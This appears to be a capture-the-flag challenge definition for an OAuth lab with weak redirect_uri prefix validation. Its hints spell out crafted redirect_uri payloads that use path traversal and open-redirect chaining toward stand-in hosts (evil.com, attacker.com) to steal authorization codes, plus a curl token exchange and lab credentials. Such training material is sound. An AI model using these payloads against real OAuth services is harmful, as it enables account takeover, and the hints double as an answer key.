@@ -1,0 +1,162 @@
+name: "OAuth Redirect URI Manipulation"
+slug: "oauth-redirect-steal"
+difficulty: "elite"
+description: >
+  An OAuth 2.0 authorization server with weak redirect_uri validation that
+  allows attackers to steal authorization codes via open redirect manipulation.
+  The OAuth provider performs only a prefix check on redirect URIs, allowing
+  path traversal and subdomain tricks to redirect tokens to attacker-controlled
+  endpoints.
+briefing: |
+  MISSION BRIEFING - OPERATION TOKEN SNATCH
+  ===========================================
+
+  Intelligence has identified a corporate OAuth 2.0 authentication system
+  consisting of two components: an OAuth authorization server running on
+  port 8443 and a client application on port 8080.
+
+  The OAuth provider implements redirect_uri validation to prevent
+  authorization code theft, but our analysis indicates the validation is
+  flawed. The server only checks that the redirect_uri starts with the
+  registered callback URL prefix, without properly validating the full URI.
+
+  This allows an attacker to craft a redirect_uri that passes validation
+  but redirects the authorization code to an attacker-controlled endpoint
+  via path traversal or open redirect chains.
+
+  PHASE 1 - RECONNAISSANCE
+    Map both applications. Discover the OAuth endpoints (authorize, token)
+    and the client application's callback handler. Understand the OAuth
+    authorization code flow in use.
+
+  PHASE 2 - REDIRECT ANALYSIS
+    Study the redirect_uri validation logic. Test various redirect_uri
+    values to identify the weakness. The validation uses a prefix check
+    rather than an exact match, and does not properly handle path
+    traversal or URL encoding.
+
+  PHASE 3 - CODE THEFT
+    Craft a malicious redirect_uri that passes validation but redirects
+    the authorization code to an attacker-controlled endpoint. The client
+    app on port 8080 has an open redirect vulnerability that can be chained
+    with the OAuth flaw.
+
+  PHASE 4 - TOKEN EXCHANGE
+    Use the stolen authorization code to obtain an access token from the
+    OAuth token endpoint. Exchange the admin's access token for their
+    protected resources including the root flag.
+
+  Good luck, operator.
+author: "howl-team"
+cves:
+  - "CWE-601"
+tags:
+  - "oauth"
+  - "redirect-uri"
+  - "open-redirect"
+  - "authorization-code"
+  - "token-theft"
+services:
+  - name: "client"
+    port: 8080
+    protocol: "http"
+    description: "CorpApp - OAuth client application"
+  - name: "oauth"
+    port: 8443
+    protocol: "http"
+    description: "CorpAuth - OAuth 2.0 authorization server"
+
+attack_chain:
+  - name: "Reconnaissance"
+    description: >
+      Map both the OAuth authorization server and the client application.
+      Discover the OAuth endpoints (/oauth/authorize, /oauth/token),
+      the client's callback handler (/callback), and understand the
+      full authorization code flow.
+    tools_suggested:
+      - "curl"
+      - "nmap"
+      - "nikto"
+      - "burpsuite"
+    flag:
+      type: "stage"
+      path: "/var/www/.config/recon_flag.txt"
+    points: 75
+    hints:
+      - level: 1
+        text: "Access port 8080 (client app) and port 8443 (OAuth server). Look for /.well-known/oauth-authorization-server or /oauth/docs."
+      - level: 2
+        text: "The OAuth server on port 8443 exposes /oauth/docs which lists all OAuth endpoints and registered clients."
+      - level: 3
+        text: "Key endpoints: GET /oauth/authorize (authorization), POST /oauth/token (token exchange), GET /callback (client callback). The /oauth/docs includes a recon flag."
+
+  - name: "Redirect URI Analysis"
+    description: >
+      Analyze the redirect_uri validation logic in the OAuth authorization
+      server. Test various redirect_uri values to discover that the server
+      only performs a prefix check. Identify that path traversal and URL
+      encoding can bypass the validation.
+    tools_suggested:
+      - "curl"
+      - "burpsuite"
+      - "python3"
+    flag:
+      type: "stage"
+      path: "/opt/secrets/redirect_flag.txt"
+    points: 100
+    hints:
+      - level: 1
+        text: "Try modifying the redirect_uri parameter: /oauth/authorize?response_type=code&client_id=corpapp&redirect_uri=http://localhost:8080/callback/../evil"
+      - level: 2
+        text: "The validation checks if redirect_uri.startswith('http://localhost:8080/callback'). Adding path traversal like /callback/../attacker passes validation."
+      - level: 3
+        text: "The client app has an open redirect at /redirect?url=<destination>. Chain: redirect_uri=http://localhost:8080/callback?next=http://evil.com passes prefix check."
+
+  - name: "Authorization Code Theft"
+    description: >
+      Steal an authorization code by crafting a malicious authorization URL
+      that passes redirect_uri validation but redirects the code to an
+      attacker-controlled endpoint. The client app's /redirect endpoint
+      can be used as a redirect gadget.
+    tools_suggested:
+      - "curl"
+      - "python3"
+      - "burpsuite"
+      - "netcat"
+    flag:
+      type: "user"
+      path: "/home/webapp/user.txt"
+    points: 150
+    hints:
+      - level: 1
+        text: "Craft an authorize URL with redirect_uri=http://localhost:8080/callback/../redirect?url=http://attacker.com. Login as admin to get the code redirected."
+      - level: 2
+        text: "The admin credentials are admin/OAuthAdmin2024! (discoverable via the client app's about page). Login at /oauth/authorize and capture the code from the redirect."
+      - level: 3
+        text: "Simpler approach: The /oauth/authorize endpoint also accepts redirect_uri=http://localhost:8080/callbackX which passes prefix check. Use /api/steal on port 8080 to capture codes."
+
+  - name: "Access Token & Flag"
+    description: >
+      Exchange the stolen authorization code for an access token at the
+      OAuth token endpoint. Use the admin's access token to access the
+      protected resource endpoint that returns the root flag.
+    tools_suggested:
+      - "curl"
+      - "python3"
+    flag:
+      type: "root"
+      path: "/root/root.txt"
+    points: 175
+    hints:
+      - level: 1
+        text: "Exchange the code at POST /oauth/token with grant_type=authorization_code, code=<stolen_code>, client_id=corpapp, client_secret=corpapp-secret."
+      - level: 2
+        text: "curl -X POST http://target:8443/oauth/token -d 'grant_type=authorization_code&code=<code>&client_id=corpapp&client_secret=corpapp-secret&redirect_uri=<used_redirect>'"
+      - level: 3
+        text: "Use the access token to GET /oauth/userinfo and /oauth/admin/flag on port 8443. The /oauth/admin/flag endpoint returns the root flag for admin tokens."
+
+par_time_minutes: 75
+
+docker:
+  compose_file: "docker-compose.yml"
+  build_required: true
